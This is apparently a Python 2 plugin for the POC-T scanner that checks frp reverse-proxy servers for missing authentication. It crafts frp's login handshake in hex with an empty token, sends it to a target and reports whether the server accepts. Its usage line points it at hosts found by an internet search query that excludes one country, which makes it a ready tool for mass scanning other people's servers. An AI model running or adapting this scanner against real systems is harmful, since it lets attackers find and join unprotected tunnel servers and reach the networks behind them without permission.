#!/usr/bin/env python2
# -*- encoding: utf-8 -*-
'''
@File    :   frp

Usage:
    python2  POC-T.py -s frp_weak_pass -aF "app=frp && country != cn"
'''

import time
import hashlib
import socket
import binascii
import traceback

from lib.core.data import logger


def is_valid_response(recv):
    return recv == "000100020000000100000000".decode("hex")


def get_auth_str(token=""):
    tpl = "6f00000000000000bc7b2276657273696f6e223a22%s222c22686f73746e616d65223a22222c226f73223a2277696e646f7773222c2261726368223a22616d643634222c2275736572223a22222c2270726976696c6567655f6b6579223a22%s222c2274696d657374616d70223a%s2c2272756e5f6964223a22222c226d65746173223a6e756c6c2c22706f6f6c5f636f756e74223a317d"
    version = "0.48.0"

    timestamp = str(int(time.time()))
    md5Ctx = hashlib.md5()
    token = token
    md5Ctx.update(token.encode('utf-8'))
    md5Ctx.update(timestamp.encode('utf-8'))

    priv_key = md5Ctx.hexdigest()

    insert_version = version.encode("hex")
    insert_priv_key = priv_key.encode("hex")
    insert_timestamp = timestamp.encode("hex")
    return tpl % (insert_version, insert_priv_key, insert_timestamp)


def poc(url):
    # logger.info(url)
    if url.__contains__(":"):
        ip, port = url.split(":")
        port = int(port)

    else:
        logger.warning("not valid url: %s" % url)
        ip = url
        port = 80

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((ip, port))
        hex1 = "000100010000000100000000"
        hex2 = "0000000000000001000000c5"
        hex3 = get_auth_str()
        str = binascii.unhexlify(hex1)
        s.send(str)
        str = binascii.unhexlify(hex2)
        s.send(str)
        str = binascii.unhexlify(hex3)
        s.send(str)

        recv = s.recv(1024)
    except Exception as e:
        # logger.warning(e)
        # logger.error(traceback.format_exc())
        return False
    logger.debug(recv)
    # success
    if is_valid_response(recv):
        return True
    return False


if __name__ ==  '__main__':
    poc("127.0.0.1:7000")